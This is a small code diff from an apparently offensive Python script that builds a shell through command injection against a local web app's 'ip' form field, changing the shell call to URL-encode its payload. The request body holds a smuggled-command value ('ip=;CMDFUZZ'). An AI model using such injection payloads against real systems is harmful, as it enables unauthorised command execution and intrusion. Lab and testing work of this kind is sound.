@@ -19,7 +19,7 @@ def main():
     shell.set_header("Content-Type", "application/x-www-form-urlencoded")
     shell.set_body("ip=;CMDFUZZ&Submit=Submit")
 
-    shell.create_shell()
+    shell.create_shell(urlencode=True)
 
 def get_session():
     resp = req.request("GET", "http://localhost/login.php")
